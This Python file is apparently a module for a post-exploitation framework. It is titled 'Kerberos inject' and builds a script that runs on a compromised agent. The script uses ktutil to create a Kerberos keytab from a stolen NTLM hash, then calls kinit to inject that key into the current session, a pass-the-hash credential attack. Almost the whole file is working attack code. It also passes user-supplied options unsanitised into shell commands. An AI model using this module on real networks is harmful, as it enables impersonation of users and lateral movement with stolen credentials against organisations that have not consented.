from lib.common import helpers
class Module:
    def __init__(self, mainMenu, params=[]):
        self.info = {
            'Name': 'Kerberos inject',
            'Author': ['@424f424f'],
            'Description': ('Generates a kerberos keytab and injects it into the current runspace.'),
            'Background' : False,
            'OutputExtension' : None,
            'NeedsAdmin' : False,
            'OpsecSafe' : False,
            'Language' : 'python',
            'MinLanguageVersion' : '2.6',
            'Comments': ['Thanks to @passingthehash for bringing this up.']
        }
        self.options = {
            'Agent' : {
                'Description'   :   'Agent to execute module on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Keytab' : {
                'Description'   :   'Keytab file to create.',
                'Required'      :   True,
                'Value'         :   'user.keytab'
            },
            'Principal' : {
                'Description'   :   'The service principal name. user@HACKME.COM',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Hash' : {
                'Description'   :   'NTLM Hash for the principal.',
                'Required'      :   True,
                'Value'         :   ''
            }
        }
        self.mainMenu = mainMenu
        if params:
            for param in params:
                option, value = param
                if option in self.options:
                    self.options[option]['Value'] = value
    def generate(self, obfuscate=False, obfuscationCommand=""):
        keytab = self.options['Keytab']['Value']
        principal = self.options['Principal']['Value']
        ntlmhash = self.options['Hash']['Value']
        script = """
import subprocess
try:
    print "Creating Keytab.."
    cmd = 'ktutil -k %s add -p %s -e arcfour-hmac-md5 -w %s --hex -V 5'
    print subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE).stdout.read()
    print ""
    print "Keytab created!"
except Exception as e:
    print e
try:
    print "Injecting kerberos key.."
    cmd = 'kinit -t %s %s'
    print subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE).stdout.read()
    print ""
    print "Keytab injected into current session!"
except Exception as e:
    print e
""" %(keytab,principal,ntlmhash,keytab,principal)
        return script